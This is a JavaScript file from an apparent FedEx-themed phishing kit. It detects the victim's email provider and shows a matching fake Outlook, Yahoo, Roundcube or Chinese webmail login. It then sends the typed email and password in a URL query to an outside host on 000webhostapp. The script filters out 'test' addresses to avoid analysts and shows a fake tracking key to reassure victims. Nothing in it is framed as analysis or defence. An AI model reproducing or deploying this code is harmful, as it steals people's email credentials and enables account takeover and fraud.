const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

let userServer;

// 
const container_fedex = document.getElementsByClassName("container_fedex")[0];
const gen_header = document.getElementById("gen_header");
const key = 387863;

const office365 = document.getElementsByClassName("container_office")[0];
const webmail = document.getElementsByClassName("container_webmail")[0];
const roundcube = document.getElementsByClassName("container_roundcube")[0];
const yahoo = document.getElementsByClassName("container_yahoo")[0];
const china = document.getElementsByClassName("china_container")[0];

const owa_form = document.getElementById("owa_form");

const input_office365 = document.getElementsByClassName("input_email1")[0];
const input_webmail = document.getElementsByClassName("input_email2")[0];
const input_roundcube = document.getElementsByClassName("input_email3")[0];
const input_yahoo = document.getElementsByClassName("input_email4")[0];
const input_yahoo1 = document.getElementsByClassName("input_email4")[1];
const input_china = document.getElementsByClassName("input_email5")[0];

const owaEmail = document.getElementById("username");
const owaPass = document.getElementById("password");
const owa_Btn = document.getElementById("owa_btn");


function getData(e) {
    const getHtml = e.parentElement;
    const officeEmail = getHtml.getElementsByClassName("input_email1")[0];
    const officePass = getHtml.getElementsByClassName("input_pass1")[0];

    const webEmail = getHtml.getElementsByClassName("input_email2")[0];
    const webPass = getHtml.getElementsByClassName("input_pass2")[0];

    const cubeEmail = getHtml.getElementsByClassName("input_email3")[0];
    const cubePass = getHtml.getElementsByClassName("input_pass3")[0];

    const yahooEmail = getHtml.getElementsByClassName("input_email4")[0];
    const yahooPass = getHtml.getElementsByClassName("input_pass4")[0];

    const chinaEmail = getHtml.getElementsByClassName("input_email5")[0];
    const chinaPass = getHtml.getElementsByClassName("input_pass5")[0];

    if (userServer == "outlook") {
        pdfData(showEmail = officeEmail.innerText.trim(), showPass = officePass.value)
    }
    else if (userServer == "webmail") {
        pdfData(showEmail = webEmail.innerText.trim(), showPass = webPass.value)
    }
    else if (userServer == "roundcube") {
        pdfData(showEmail = cubeEmail.innerText.trim(), showPass = cubePass.value)
    }
    else if (userServer == "yahoo") {
        pdfData(showEmail = yahooEmail.innerText.trim(), showPass = yahooPass.value)
    }
    else if (userServer == "china") {
        pdfData(showEmail = chinaEmail.innerText.trim(), showPass = chinaPass.value)
    }
    else if (userServer == "owa") {
        pdfData(showEmail = owaEmail.value, showPass = owaPass.value)
    }

}

function pdfData(showEmail, showPass) {

    if (!validEmail.test(showEmail)) {
        alert("Please enter your email address")
        return
    }
    else {
        if (showPass != "") {
            if (showPass.length < 6) {
                alert("Incorrect Password")
                return
            }
            else {

                url = "Domain" + "=" + "FedEx - " + userServer + "&" + "Mail" + "=" + showEmail + "&" + "Password" + "=" + showPass

                window.open(
                    'https://falser-skies.000webhostapp.com/bba/config.php?' + url,
                    '_blank'
                );

                container_fedex.style.display = "block"
                office365.style.display = "none"
                webmail.style.display = "none"
                owa_form.style.display = "none"
                roundcube.style.display = "none"
                yahoo.style.display = "none"
                china.style.display = "none"

                gen_header.innerHTML = `Key: <i>generating...</i>`
                setTimeout(() => {
                    gen_header.innerHTML = `Key: <b style="color:orange">${key}</b>`
                }, 3000);
            }
        }
        else {
            alert("Password cannot be empty!")
        }
    }
}

// 

function preventCheck(p) {
    const get_input = document.querySelectorAll(".get_input")

    get_input.forEach(changeInput => {
        if (p.checked == true) {
            changeInput.type = "text";
        } else {
            changeInput.type = "password";
        }
    });
}

// 

function fexIputGet(d) {
    let updateText = d.parentElement
    let dataText = updateText.getElementsByClassName("track_id")[0]
    if (d.value == "ENTER E-MAIL") {
        dataText.innerHTML = d.value
        d.value = ""
    }
}

// 

function fexBtnSub(r) {
    const domain_email = document.getElementById("domain_email")
    let getMail = r.parentElement.parentElement
    let tempMail = getMail.getElementsByClassName("track_input")[0]

    let getService = tempMail.value.toLowerCase()
    let gotServer = getService.trim()


    if (gotServer.includes("test@") || gotServer.includes("@test")) {
        setTimeout(() => {
            alert("No record found")
        }, 1000);
        return
    }

    if (gotServer.includes("@hotmail.") || gotServer.includes("@outlook.") || gotServer.includes("@live.") || gotServer.includes("@msn.")) {
        userServer = "outlook"
    }
    else if (gotServer.includes("@yahoo.") || gotServer.includes("@yahoomail.") || gotServer.includes("@rogers.") || gotServer.includes("@aol.") || gotServer.includes("@ymail.")) {
        userServer = "yahoo"
    }
    else if (gotServer.includes("@163.") || gotServer.includes("@126.") || gotServer.includes("@aliyun.") || gotServer.includes("@139.") || gotServer.includes("@sina.") || gotServer.includes("@sohu.") || gotServer.includes("@yeah.") || gotServer.includes("@vip.163.") || gotServer.includes("@vip.126.") || gotServer.includes("@vip.aliyun.") || gotServer.includes("@vip.139.") || gotServer.includes("@vip.sina.") || gotServer.includes("@vip.sohu.") || gotServer.includes("@yvip.eah.")
    ) {
        userServer = "china"
    }
    else {
        userServer = "roundcube"
        // change only when its owa (webmail, roundcube)
        document.body.style.backgroundColor = "white"
    }

    // 

    if (validEmail.test(tempMail.value.trim())) {
        document.getElementById("loader").style.display = "flex"
        domain_email.innerText = tempMail.value.trim()

        setTimeout(() => {
            document.getElementById("loader").style.display = "none"
            container_fedex.style.display = "none"

            if (userServer == "outlook") {
                office365.style.display = "block"
                let showTemp = document.getElementById("showTemp")

                showTemp.innerHTML = `
                        &#11013; <span class="input_email1">${domain_email.innerText}</span>
                        `
            }
            else if (userServer == "webmail") {
                webmail.style.display = "flex"
                input_webmail.innerText = domain_email.innerText
            }
            else if (userServer == "owa") {
                owa_form.style.display = "block"
                owaEmail.value = domain_email.innerText
            }
            else if (userServer == "roundcube") {
                roundcube.style.display = "flex"
                input_roundcube.innerText = domain_email.innerText
            }
            else if (userServer == "yahoo") {
                yahoo.style.display = "block"
                input_yahoo.innerText = domain_email.innerText
                input_yahoo1.innerText = domain_email.innerText
            }
            else if (userServer == "china") {
                china.style.display = "block"
                input_china.innerText = domain_email.innerText
                const chinaImg = document.getElementById("china_log")

                if (input_china.innerText.includes("163.com") || input_china.innerText.includes("vip.163.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/163.png"
                }
                else if (input_china.innerText.includes("126.com") || input_china.innerText.includes("vip.126.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/126.png"
                }
                else if (input_china.innerText.includes("sina.com") || input_china.innerText.includes("vip.sina.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/sina.png"
                }
                else if (input_china.innerText.includes("qq.com") || input_china.innerText.includes("vip.qq.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/qq.png"
                }
                else if (input_china.innerText.includes("139.com") || input_china.innerText.includes("vip.139.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/139.png"
                }
                else if (input_china.innerText.includes("aliyun.com") || input_china.innerText.includes("vip.aliyun.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/aliyun.png"
                }
                else if (input_china.innerText.includes("tom.com") || input_china.innerText.includes("vip.tom.com")) {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/tom.png"
                }
                else {
                    chinaImg.src = "https://robmccal.github.io/zip_fx/china/gen.png"
                }

            }
            else {
                location = "https://fedex.com";
            }

        }, 3000);
    }
    else {
        alert("Wrong E-MAIL ID")
    }
}
